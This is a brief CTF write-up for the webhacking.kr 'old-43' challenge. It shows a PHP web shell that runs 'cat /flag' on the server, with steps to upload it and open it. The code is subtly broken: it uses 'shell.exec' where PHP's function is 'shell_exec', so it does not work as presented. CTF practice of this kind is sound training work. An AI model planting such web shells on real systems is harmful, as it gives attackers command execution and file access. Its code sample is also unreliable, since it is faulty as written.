Hello, hello, and hello there. Welcome to my webhacking.kr CTF writeup. Today's task is rather simple, upload a PHP web shell, and complete the challenge.

![question](/assets/images/webhackingkr/2020-09-12-old-43/1.png)

Just follow the instruction by creating a simple PHP file.

```php
<?php
$output = shell.exec('cat /flag');
echo "$output";
?>
```

Save it as a .php file, upload it and visit the uploaded file.

P/s: try decode the base64 text and that is what I thought.
